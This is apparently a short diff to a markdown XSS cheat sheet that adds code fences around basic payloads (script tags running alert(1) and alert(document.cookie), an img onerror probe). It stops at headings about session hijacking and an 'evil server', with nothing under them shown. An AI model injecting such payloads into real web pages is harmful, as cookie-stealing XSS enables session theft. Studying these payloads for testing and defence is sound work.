@@ -1,5 +1,5 @@
 # basic payload
-
+```
 <h1>xss try</h1>
 <script>alert(1)</script>
 <script>alert(document.cookie)</script>
@@ -7,7 +7,7 @@
 
 “>img src=x onerror=alert(1)>
 
-
+```
 # XSS attack 1: Hijacking the user’s session
 ## Evil server 
 ```bash
